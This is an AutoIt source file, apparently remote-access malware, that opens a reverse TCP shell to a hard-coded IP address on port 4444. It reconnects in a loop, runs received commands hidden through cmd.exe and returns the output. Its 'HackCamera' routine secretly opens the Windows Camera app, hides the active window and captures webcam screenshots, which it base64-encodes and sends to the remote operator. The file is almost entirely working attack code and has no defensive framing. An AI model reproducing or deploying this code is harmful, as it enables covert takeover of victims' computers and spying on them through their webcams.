;~ /*
;~ /* File: SomeThing.au3
;~ /* Author: TiDz
;~ /* Contact: nguyentinvs123@gmail.com
;~  * Created on Thu Apr 03 2025
;~  *
;~  * Description: 
;~  *
;~  * The MIT License (MIT)
;~  * Copyright (c) 2025 TiDz
;~  *
;~  * Permission is hereby granted, free of charge, to any person obtaining a copy of this software
;~  * and associated documentation files (the "Software"), to deal in the Software without restriction,
;~  * including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense,
;~  * and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so,
;~  * subject to the following conditions: unconditional.
;~  *
;~  * Useage: 
;~  */
#include <AutoItConstants.au3>
#include <GUIConstantsEx.au3>
#include <MsgBoxConstants.au3>
#include <ScreenCapture.au3>
#include <Array.au3>

Global Const $HOST = "103.97.127.14"
Global Const $PORT = 4444
Global $historyImg[0]
Global $currentDir = @WorkingDir
Global $socket = -1


Func ConnectToServer()
	While 1
		If Ping($HOST, 250) Then
			TCPStartup()
			$socket = TCPConnect($HOST, $PORT)
			If $socket <> -1 Then
				Return $socket
			Else
				TCPCloseSocket($socket)
;~ 				TCPShutdown()
			EndIf
		EndIf
		Sleep(1000)
	WEnd
EndFunc

Func AddToDynamicArray(ByRef $a, $v) ;support array function
    Local $i = UBound($a) 
    ReDim $a[$i + 1]
    $a[$i] = $v
EndFunc

Func BinaryToBase64($bin) ;support function
    Local $xml = ObjCreate("Msxml2.DOMDocument.3.0")
    If Not IsObj($xml) Then
        Return ""
    EndIf
    Local $node = $xml.createElement("base64")
    $node.dataType = "bin.base64"
    $node.nodeTypedValue = $bin
    Return $node.text
EndFunc

Func ExecuteCommand($sCmd)
    Local $pid = Run(@ComSpec & " /c " & $sCmd, "", @SW_HIDE, $STDOUT_CHILD)
    Local $output = ""
    Local $line = ""
    While 1
        $line = StdoutRead($pid)
        If @error Or $line = "" Then ExitLoop
        $output &= $line
    WEnd
    Return $output
EndFunc

Func HackCamera()
	$on = WinGetHandle("[ACTIVE]")
	$pos = WinGetPos($on)
	WinSetOnTop($on, "", $WINDOWS_ONTOP)
	Run(@ComSpec & " /c " & "start microsoft.windows.camera:", "", @SW_HIDE, $STDOUT_CHILD)
	For $i = 1 To 10 Step 1
		$hwnd = WinGetHandle("Camera")
		If Not @error Then
			WinMove($on,"",-1000, -1000)
			WinActivate($hwnd)
			$pos = WinGetPos($hwnd)
			_ScreenCapture_Capture(@ScriptDir & "\" & $i & ".jpg", $pos[0], $pos[1], $pos[0] + $pos[2], $pos[1] + $pos[3])
			Local $file = FileOpen(@ScriptDir & "\" & $i & ".jpg", 16)
			If $file = -1 Then
				Exit
			EndIf
			Local $data = FileRead($file)
			FileClose($file)
			Local $base = BinaryToBase64($data)
			AddToDynamicArray($historyImg, $base)
		EndIf
		Sleep(400)
	Next
	WinMove($on, "", $pos[0], $pos[1])
	WinKill($hwnd)
	return "Done"
EndFunc

$socket = ConnectToServer()
TCPSend($socket, $currentDir & "> ")
Local $lastCheck = TimerInit()

While 1
    If TimerDiff($lastCheck) > 30000 Then
        If TCPSend($socket, " ") = 0 Then ;check if disconnected
            TCPCloseSocket($socket)
            TCPShutdown()
            $socket = ConnectToServer()
            TCPSend($socket, $currentDir & "> ")
        EndIf
        $lastCheck = TimerInit()  
    EndIf
    Local $recv = TCPRecv($socket, 1024)
    If $recv <> "" Then
        $recv = StringStripWS($recv, 3)
        If StringLeft($recv, 3) = "cd " Then
            Local $dirToChange = StringStripWS(StringTrimLeft($recv, 3), 3)
            If FileChangeDir($dirToChange) Then
                $currentDir = @WorkingDir
                TCPSend($socket, $currentDir & "> ")
            Else
                TCPSend($socket, "[!] Failed to change directory" & @CRLF)
                TCPSend($socket, $currentDir & "> ")
            EndIf
		ElseIf StringLeft($recv, 3) = "cc " Then
			Local $d = HackCamera()
			TCPSend($socket, "-------"&$d&"-----" & @CRLF)
			TCPSend($socket, $currentDir & "> ")
		ElseIf StringLeft($recv, 3) = "vv " Then
			Local $get = Number(StringStripWS(StringTrimLeft($recv, 3), 3))
			Local $baseOut = $historyImg[$get]
			TCPSend($socket, $baseOut & @CRLF)
			TCPSend($socket, $currentDir & "> ")
        Else
            Local $cmdOutput = ExecuteCommand($recv)
            TCPSend($socket, $cmdOutput)
            TCPSend($socket, $currentDir & "> ")
            Sleep(500)
        EndIf
    EndIf
WEnd

TCPCloseSocket($socket)
TCPShutdown()
